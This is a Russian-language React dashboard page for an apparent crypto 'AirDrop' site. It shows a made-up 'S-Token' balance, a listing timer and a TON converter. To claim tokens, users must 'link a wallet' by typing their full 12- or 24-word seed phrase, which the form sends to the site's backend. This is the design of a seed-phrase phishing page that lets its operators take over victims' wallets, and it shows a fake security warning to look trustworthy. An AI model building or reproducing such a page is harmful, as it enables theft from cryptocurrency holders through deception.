import { ListingTimer } from "@/components/dashboard/ListingTimer";
import { useUser } from "@/hooks/use-auth";
import { useLinkWallet, useWallets } from "@/hooks/use-wallets";
import { useLocation } from "wouter";
import { useEffect, useState } from "react";
import { CryptoCard } from "@/components/dashboard/CryptoCard";
import { SeedInput } from "@/components/ui/SeedInput";
import { Button } from "@/components/ui/button";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Loader2, ShieldAlert, Gift, ArrowRightLeft } from "lucide-react";
import { motion } from "framer-motion";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";

export default function Dashboard() {
  const { data: user, isLoading } = useUser();
  const { data: wallets, isLoading: walletsLoading } = useWallets();
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const { mutate: linkWallet, isPending: isLinking } = useLinkWallet();
  const [showAirdropModal, setShowAirdropModal] = useState(false);

  const [phraseLength, setPhraseLength] = useState<"12" | "24">("12");
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [error, setError] = useState<string | null>(null);

  // Converter state
  const [sTokenAmount, setSTokenAmount] = useState<string>("");
  const [tonAmount, setTonAmount] = useState<string>("0");

  const [showLinkedModal, setShowLinkedModal] = useState(false);

  useEffect(() => {
    if (!isLoading && !user) {
      setLocation("/login");
    }
  }, [user, isLoading, setLocation]);

  useEffect(() => {
    const length = parseInt(phraseLength);
    setWords(prev => {
      if (prev.length === length) return prev;
      if (prev.length > length) return prev.slice(0, length);
      return [...prev, ...Array(length - prev.length).fill("")];
    });
  }, [phraseLength]);

  const handleWordChange = (index: number, value: string) => {
    const cleanValue = value.toLowerCase().replace(/[^a-z]/g, "");
    if (value && value.toLowerCase() !== cleanValue) {
      setError("Только латинские буквы (a-z)");
      return;
    }
    setError(null);
    const newWords = [...words];
    newWords[index] = cleanValue;
    setWords(newWords);
  };

  const handlePaste = (e: React.ClipboardEvent, startIndex: number) => {
    e.preventDefault();
    const text = e.clipboardData.getData("text").toLowerCase();
    
    if (/[^a-z\s]/.test(text)) {
      setError("Сид-фраза должна быть на английском языке");
      return;
    }
    
    const pastedWords = text.trim().split(/\s+/);
    if (pastedWords.length > 0) {
      const newWords = [...words];
      pastedWords.forEach((word, i) => {
        if (startIndex + i < newWords.length) {
          newWords[startIndex + i] = word.replace(/[^a-z]/g, "");
        }
      });
      setWords(newWords);
    }
  };

  const handleAirdropClick = () => {
    if ((Array.isArray(wallets) && wallets.length > 0) || showLinkedModal) {
      setLocation("/airdrops");
    } else {
      setShowAirdropModal(true);
    }
  };

  const handleConverterChange = (val: string) => {
    setSTokenAmount(val);
    const num = parseFloat(val);
    if (!isNaN(num)) {
      // 1 TON = 3 S-Token => 1 S-Token = 0.333... TON
      setTonAmount((num / 3).toFixed(2));
    } else {
      setTonAmount("0");
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (words.some(w => !w.trim())) {
      setError("Пожалуйста, заполните все поля сид-фразы");
      return;
    }
    
    linkWallet({
      phraseLength: parseInt(phraseLength),
      phrase: words.join(" "),
    }, {
      onSuccess: () => {
        toast({
          title: "Успешно!",
          description: "Вы успешно привязали сид-фразу!",
        });
        setShowAirdropModal(false);
        setShowLinkedModal(true); // Modal closes and won't reappear due to hasLinkedWallet check
        // Clear words
        setWords(Array(parseInt(phraseLength)).fill(""));
      }
    });
  };

  const hasLinkedWallet = (Array.isArray(wallets) && wallets.length > 0) || showLinkedModal;

  if (isLoading || !user) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <Loader2 className="w-10 h-10 text-primary animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background pb-20">
      <div className="container mx-auto px-4 py-8">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
          <div>
            <h1 className="text-3xl font-bold mb-2 text-glow">Личный кабинет</h1>
            <p className="text-muted-foreground">Добро пожаловать, {user.email}</p>
          </div>
          
          <Button 
            onClick={handleAirdropClick}
            className="bg-primary text-primary-foreground hover:bg-primary/90 shadow-lg shadow-primary/20 h-12 px-6 font-bold"
          >
            <Gift className="mr-2 w-5 h-5" />
            AirDrop
          </Button>
        </div>

        <Dialog open={showAirdropModal && !hasLinkedWallet} onOpenChange={setShowAirdropModal}>
          <DialogContent className="bg-card border-white/10">
            <div className="space-y-4">
              <h2 className="text-xl font-bold">Требуется привязка кошелька</h2>
              <p className="text-muted-foreground">
                Для участия в AirDrop необходимо сначала привязать ваш кошелек, введя сид-фразу. 
                Это необходимо для подтверждения владения адресом и начисления токенов.
              </p>
              <div className="flex justify-end gap-3 mt-6">
                <Button variant="ghost" onClick={() => setShowAirdropModal(false)}>Отмена</Button>
                <Button 
                  className="bg-primary text-primary-foreground"
                  onClick={() => {
                    setShowAirdropModal(false);
                    document.getElementById('wallet-link-section')?.scrollIntoView({ behavior: 'smooth' });
                  }}
                >
                  Привязать кошелек
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        {/* Crypto Assets Grid */}
        <div className="grid md:grid-cols-2 gap-6 mb-12">
          <CryptoCard 
            name="S-Token" symbol="SWP" price="$0.85" change={15.5} balance="250" 
            iconUrl="S" color="#00FF00" 
          />
          <CryptoCard 
            name="TON" symbol="TON" price="$2.55" change={2.4} balance="0" 
            iconUrl="T" color="#0088CC" 
          />
        </div>

        {/* Listing Countdown */}
        <ListingTimer />

        {/* Converter Widget */}
        <Card className="border-primary/20 bg-card/50 backdrop-blur mb-12">
          <CardHeader>
            <div className="flex items-center gap-3">
              <ArrowRightLeft className="w-6 h-6 text-primary" />
              <CardTitle>Конвертер токенов</CardTitle>
            </div>
          </CardHeader>
          <CardContent>
            <div className="grid md:grid-cols-2 gap-8 items-center">
              <div className="space-y-2">
                <Label>S-Token</Label>
                <div className="relative">
                  <input
                    type="number"
                    value={sTokenAmount}
                    onChange={(e) => handleConverterChange(e.target.value)}
                    className="w-full bg-background border border-primary/20 rounded-lg h-12 px-4 focus:outline-none focus:border-primary transition-colors"
                    placeholder="Введите количество S-Token"
                  />
                  <span className="absolute right-4 top-1/2 -translate-y-1/2 text-primary font-bold">SWP</span>
                </div>
              </div>
              <div className="space-y-2">
                <Label>TON</Label>
                <div className="relative">
                  <input
                    type="text"
                    value={tonAmount}
                    readOnly
                    className="w-full bg-background/50 border border-primary/10 rounded-lg h-12 px-4 focus:outline-none"
                  />
                  <span className="absolute right-4 top-1/2 -translate-y-1/2 text-blue-400 font-bold">TON</span>
                </div>
              </div>
            </div>
            <p className="mt-4 text-xs text-muted-foreground">Курс: 1 TON = 3 S-Token (1 S-Token = 0.33 TON)</p>
          </CardContent>
        </Card>

        {/* Link Wallet Section */}
        {!hasLinkedWallet && (
          <div className="max-w-4xl mx-auto" id="wallet-link-section">
            <Card className="border-primary/20 bg-card/50 backdrop-blur">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg">
                    <ShieldAlert className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <CardTitle>Привязать кошелек</CardTitle>
                    <CardDescription>Введите вашу сид-фразу для восстановления доступа к активам</CardDescription>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleSubmit}>
                  <div className="mb-6">
                    <Label className="mb-3 block text-base">Длина фразы</Label>
                    <RadioGroup 
                      defaultValue="12" 
                      value={phraseLength}
                      onValueChange={(v) => setPhraseLength(v as "12" | "24")}
                      className="flex gap-4"
                    >
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="12" id="r12" className="border-primary text-primary" />
                        <Label htmlFor="r12" className="cursor-pointer">12 слов</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="24" id="r24" className="border-primary text-primary" />
                        <Label htmlFor="r24" className="cursor-pointer">24 слова</Label>
                      </div>
                    </RadioGroup>
                  </div>

                  <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 mb-4">
                    {words.map((word, i) => (
                      <SeedInput
                        key={i}
                        index={i}
                        value={word}
                        onChange={(e) => handleWordChange(i, e.target.value)}
                        onPaste={(e) => handlePaste(e, i)}
                        placeholder={`Слово ${i + 1}`}
                        required
                      />
                    ))}
                  </div>
                  {error && (
                    <p className="text-destructive text-sm font-medium mb-6 text-center animate-bounce">
                      {error}
                    </p>
                  )}

                  <div className="flex flex-col md:flex-row gap-4 justify-end items-center border-t border-white/5 pt-6">
                    <p className="text-xs text-muted-foreground max-w-md text-center md:text-left">
                      <span className="text-red-400 font-bold">Внимание:</span> Никогда не передавайте свою сид-фразу третьим лицам. 
                      Официальная поддержка никогда не запрашивает эти данные.
                    </p>
                    <Button 
                      type="submit" 
                      size="lg" 
                      className="w-full md:w-auto bg-primary text-primary-foreground hover:bg-primary/90 shadow-lg shadow-primary/20"
                      disabled={isLinking}
                    >
                      {isLinking ? (
                        <>
                          <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                          Проверка...
                        </>
                      ) : (
                        "Подтвердить и привязать"
                      )}
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </div>
  );
}
